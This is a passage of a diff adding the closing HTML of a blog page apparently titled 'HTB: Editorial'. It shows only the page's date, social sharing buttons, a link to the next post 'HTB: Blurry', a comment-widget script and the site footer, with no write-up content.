+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-10-16 21:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Editorial&amp;caption=HTB%3a%20Editorial&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Editorial&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f;description=HTB%3a%20Editorial" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f&amp;title=HTB%3a%20Editorial&amp;summary=HTB%3a%20Editorial&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f&amp;resubmit=true&amp;title=HTB%3a%20Editorial" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f;title=HTB%3a%20Editorial" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Editorial%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f&amp;t=HTB%3a%20Editorial" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Editorial&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f10%2fhtb-editorial%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/fr/posts/2024/10/htb-blurry/">
+                    <span class="button__text">HTB: Blurry</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
